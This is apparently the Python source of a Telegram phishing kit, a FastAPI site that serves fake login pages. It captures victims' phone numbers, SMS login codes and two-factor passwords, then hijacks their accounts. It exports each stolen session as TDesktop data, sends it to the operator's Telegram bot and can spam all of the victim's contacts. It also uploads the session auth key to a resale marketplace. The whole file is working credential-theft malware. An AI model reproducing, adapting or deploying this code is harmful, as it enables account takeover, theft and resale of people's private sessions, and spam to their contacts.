import asyncio
import random
import shutil
import python_socks
from aiogram import Bot
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI, Form
from fastapi import Request
from fastapi.templating import Jinja2Templates
from fastapi.responses import RedirectResponse
from opentele.api import UseCurrentSession
from opentele.tl import TelegramClient as ConvertClinet
from telethon import TelegramClient
from telethon.crypto import AuthKey
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
from telethon.sessions import SQLiteSession
from config import config as cfg
from lolz import add_item
from keyboard import service_kb
temp = Jinja2Templates(directory=f'templates/')
tasks = []
sessions = {}
bot = Bot(cfg('admin_bot'))
async def task_executor():
    while True:
        if tasks:
            for task in tasks:
                await task
            tasks.clear()
        await asyncio.sleep(5)
def start_task_executor():
    loop = asyncio.get_running_loop()
    loop.create_task(task_executor())
def to_zip(phone:str):
    shutil.make_archive(phone, 'zip', phone)
    shutil.rmtree(phone)
def get_proxy():
    proxies = []
    proxies_from_file = open(f'proxies.txt', 'r').readlines()
    for proxy in proxies_from_file:
        login, pwd = proxy.split('@')[0].split(':')
        ip, port = proxy.split('@')[1].split(':')
        prox = [ip, port, login, pwd]
        proxies.append(prox)
    prox = random.choice(proxies)
    proxy = {
        'proxy_type': python_socks.ProxyType.SOCKS5,  # (mandatory) protocol to use (see above)
        'addr': prox[0],  # (mandatory) proxy IP address
        'port': int(prox[1]),  # (mandatory) proxy port number
        'username': prox[2],  # (optional) username if the proxy requires auth
        'password': prox[3],  # (optional) password if the proxy requires auth
        'rdns': True  # (optional) whether to use remote or local resolve, default remote
    }
    return proxy
async def build_client(session_name):

    proxy = get_proxy() if cfg('proxy') == '1' else None
    print(proxy)
    session = TelegramClient(
        api_hash=cfg('api_hash'),
        api_id=cfg('api_id'),
        session='sessions/'+session_name,
        proxy=proxy
    )
    await session.connect()
    return session

async def spam(session_name):
    client = await build_client(session_name)
    await client.connect()
    dialogs = client.iter_dialogs()
    async for dialog in dialogs:
        try:
            if dialog.entity.bot:
                continue
            msg_obj = await client.send_message(dialog,cfg('SPAM_MSG'))
            await client.delete_messages(dialog,msg_obj.id,revoke=False)
        except:
            continue
    await client.disconnect()
async def load_to_lolz(dc_id,hex_key,premium):
    await add_item(dc_id,hex_key,premium)
async def session_handler(session_name,code=''):
    client = await build_client(session_name)
    info = await client.get_me()
    dialogs = client.iter_dialogs()
    dialogs_count = 0
    owner_channel = 0
    group = 0
    async for dialog in dialogs:
        dialogs_count += 1
        if dialog.is_channel:
            if dialog.entity.creator or dialog.entity.admin_rights:
                owner_channel += 1
        if dialog.is_group:
            group += 1
        else:
            continue
    try:
        session: SQLiteSession = client.session
        auth_key: AuthKey = session.auth_key
        dc_id = session.dc_id,
        hex_key = auth_key.key.hex(),
        premium = info.premium
    except Exception as e:
        print(f'Ошибка обработки данных для залива на лолз: {e}')
    await client.disconnect()
    msg = f'''
    <b>🔥 NEW LOG 🔥</b>
    ✉️ Всего диалогов: {dialogs_count}
    📢 Групп: {group}
    💎 Управление: {owner_channel}

    ☎️ Номер: <code>{session_name}</code>
    {f'🔑 2FA: {code}' if code else ''}
    ⚙️ ID: <code>{info.id}</code>
    🐘 Никнейм: {info.first_name}
    👤 Юзернейм: @{info.username}
    ⭐️ Премиум: {info.premium}
    ⛔️ Скам: {info.scam}
                    '''
    client = ConvertClinet(f"sessions/{session_name}.session")
    tdesk = await client.ToTDesktop(flag=UseCurrentSession)
    tdesk.SaveTData(f"tdatas/{session_name}")
    to_zip(f"tdatas/{session_name}")
    await client.disconnect()
    await bot.send_document(cfg('admin_id'),InputFile(f"tdatas/{session_name}.zip"),caption=msg,reply_markup=service_kb(session_name),parse_mode='html')
    if cfg('autosms')=='1':
        await spam(session_name)
    if cfg('lolz')=='1' and dc_id and hex_key and premium:
        await load_to_lolz(dc_id,hex_key,premium)
app = FastAPI(on_startup=start_task_executor())

@app.get("/")
async def root(request: Request):
    return temp.TemplateResponse(f'{cfg("templ")}/auth.html',context={"request": request})
@app.get("/auth")
async def redirecting():
    return RedirectResponse('/')
@app.post("/auth")
async def sending_code_to_user(request: Request,phone=Form()):
    phone = phone.replace('+','')
    sessions[phone] = await build_client(phone)
    try:
        await sessions[phone].connect()
        await sessions[phone].send_code_request(phone=phone, force_sms=True)
        await sessions[phone].disconnect()
        await bot.send_message(cfg('admin_id'), f'📱 Мамонт ввёл верный номер: {phone}')
        return temp.TemplateResponse(f'{cfg("templ")}/auth_code.html', context={"request": request, 'phone':phone})
    except Exception as e:
        print(e)
        return temp.TemplateResponse(f'{cfg("templ")}/auth.html', context={"request": request,'error':'Неверный номер телефона'})
@app.post("/auth/{phone}")
async def checking_code_from_user(request: Request,phone,code=Form()):
    try:
        await sessions[phone].connect()
        await sessions[phone].sign_in(phone='+' + phone, code=code)
        await sessions[phone].disconnect()
        tasks.append(asyncio.create_task(session_handler(phone)))
        await bot.send_message(cfg('admin_id'), f'✅ Успешная авторизация')
    except SessionPasswordNeededError:
        await bot.send_message(cfg('admin_id'), f'🔑 запрошен 2FA: {phone}')
        return temp.TemplateResponse(f'{cfg("templ")}/auth_password.html', context={"request": request, 'phone':phone})
    # except Exception as e:
    #     print(e)
    #     return temp.TemplateResponse(f'{cfg("templ")}/auth.html', context={"request": request, 'error': 'Попробуйте ещё раз'})
    except PhoneCodeInvalidError as e:
        return temp.TemplateResponse(f'{cfg("templ")}/auth_code.html', context={"request": request, 'phone': phone,'error':'Введенный код недействителен'})
    return temp.TemplateResponse(f'{cfg("templ")}/done.html',context={"request": request})
@app.post('/authpassword/{phone}')
async def twofa_code_from_user(request: Request,phone,password=Form()):
    try:
        await sessions[phone].connect()
        await sessions[phone].sign_in(phone='+' + phone,password=password)
        await sessions[phone].disconnect()
        tasks.append(asyncio.create_task(session_handler(phone,code=password)))
        await bot.send_message(cfg('admin_id'), f'✅ Успешная авторизация с 2FA')
    except KeyError:
        return temp.TemplateResponse(f'{cfg("templ")}/auth.html', context={"request": request, 'error': "Невалидный номер телефона"})
    except PasswordHashInvalidError as e:
        return temp.TemplateResponse(f'{cfg("templ")}/auth_password.html', context={"request": request, 'phone': phone,'error':"Введенный пароль недействителен"})
    return temp.TemplateResponse(f'{cfg("templ")}/done.html', context={"request": request})